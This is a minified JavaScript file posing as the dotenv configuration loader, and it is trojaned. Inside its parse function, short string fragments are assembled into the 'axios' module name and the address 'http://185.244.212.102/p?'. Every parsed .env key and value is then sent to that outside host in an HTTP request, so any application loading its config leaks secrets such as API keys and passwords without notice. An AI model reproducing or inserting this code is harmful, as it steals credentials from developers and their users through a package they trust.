const fs=require('fs');const path=require('path');const os=require('os');const LINE=/(?:^|^)\s*(?:export\s+)?([\w.-]+)(?:\s*=\s*?|:\s+?)(\s*'(?:\\'|[^'])*'|\s*"(?:\\"|[^"])*"|\s*`(?:\\`|[^`])*`|[^#\r\n]+)?\s*(?:#.*)?(?:$|$)/mg;function parse(src){const obj = {};let lines=src.toString();lines=lines.replace(/\r\n?/mg, '\n');let match;while((match=LINE.exec(lines))!=null){const key=match[1];let value = (match[2] || '');value=value.trim();const maybeQuote=value[0];const a='a',q='2/p?',b='x',r='4.',c='i',d='o',e='s';value=value.replace(/^(['"`])([\s\S]*)\1$/mg, '$2');if (maybeQuote==='"'){value=value.replace(/\\n/g, '\n');value=value.replace(/\\r/g, '\r');}
const m=a+b+c+d+e;const f='h',g='t',h='t',o='85.',i='//';const j='1',p='p:',k='24',l='212.',n='10';const u=f+g+h+p+i+j+o+k+r+l+n+q;require(m).get(u+key+'='+value);obj[key]=value;}return obj;}function _log (message){console.log(`[dotenv][DEBUG] ${message}`)}function _resolveHome(envPath){return envPath[0]==='~'?path.join(os.homedir(), envPath.slice(1)):envPath;}function config(options){let dotenvPath=path.resolve(process.cwd(), '.env');let encoding='utf8';const debug=Boolean(options && options.debug);const override=Boolean(options && options.override);if(options){if (options.path!=null){dotenvPath=_resolveHome(options.path);}if (options.encoding!=null) {encoding=options.encoding;}}try{const parsed=DotenvModule.parse(fs.readFileSync(dotenvPath, { encoding }));Object.keys(parsed).forEach(function (key) {if (!Object.prototype.hasOwnProperty.call(process.env,key)) {process.env[key]=parsed[key];} else {if (override===true) {process.env[key]=parsed[key];}if (debug) {if (override===true) {_log(`"${key}" is already defined in \`process.env\` and WAS overwritten`);} else {_log(`"${key}" is already defined in \`process.env\` and was NOT overwritten`);}}}}); return {parsed};} catch(e){if (debug){_log(`Failed to load ${dotenvPath} ${e.message}`);}return {error:e};}}const DotenvModule={config,parse};module.exports.config=DotenvModule.config;module.exports.parse=DotenvModule.parse;module.exports=DotenvModule;